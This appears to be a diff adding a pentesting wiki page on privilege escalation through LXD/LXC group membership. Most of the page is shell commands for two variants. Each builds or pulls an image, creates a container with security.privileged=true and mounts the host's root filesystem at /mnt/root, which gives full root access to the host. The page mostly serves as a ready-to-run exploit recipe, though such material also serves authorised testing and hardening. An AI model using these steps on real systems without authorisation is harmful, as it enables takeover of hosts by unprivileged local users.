@@ -1,0 +1,42 @@
+<h1 id="lxc-Privilege-escalation"><a href="#lxc-Privilege-escalation" class="headerlink" title="lxc - Privilege escalation"></a>lxc - Privilege escalation</h1><p>If you belong to _<strong>lxd</strong>_ <strong>or</strong> _<strong>lxc</strong>_ <strong>group</strong>, you can become root</p>
+<h2 id="Exploiting-without-internet"><a href="#Exploiting-without-internet" class="headerlink" title="Exploiting without internet"></a>Exploiting without internet</h2><p>You can install in your machine this distro builder: <a href="https://github.com/lxc/distrobuilder">https://github.com/lxc/distrobuilder </a>(follow the instructions of the github):</p>
+<pre><code class="bash">#Install requirements
+sudo apt update
+sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
+#Clone repo
+go get -d -v github.com/lxc/distrobuilder
+#Make distrobuilder
+cd $HOME/go/src/github.com/lxc/distrobuilder
+make
+cd
+#Prepare the creation of alpine
+mkdir -p $HOME/ContainerImages/alpine/
+cd $HOME/ContainerImages/alpine/
+wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
+#Create the container
+sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
+</code></pre>
+<p>Then, upload to the server the files <strong>lxd.tar.xz</strong> and <strong>rootfs.squashfs</strong></p>
+<p>Add the image:</p>
+<pre><code class="bash">lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+lxc image list #You can see your new imported image
+</code></pre>
+<p>Create a container and add root path</p>
+<pre><code class="bash">lxc init alpine privesc -c security.privileged=true
+lxc list #List containers
+
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+</code></pre>
+<p>Execute the container:</p>
+<pre><code class="bash">lxc start privesc
+lxc exec privesc /bin/sh
+[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
+</code></pre>
+<h2 id="With-internet"><a href="#With-internet" class="headerlink" title="With internet"></a>With internet</h2><p>You can follow <a href="https://reboare.github.io/lxd/lxd-escape.html">these instructions</a>.</p>
+<pre><code class="bash">lxc init ubuntu:16.04 test -c security.privileged=true
+lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
+lxc start test
+lxc exec test bash
+[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
+</code></pre>
+<h2 id="Other-Refs"><a href="#Other-Refs" class="headerlink" title="Other Refs"></a>Other Refs</h2>
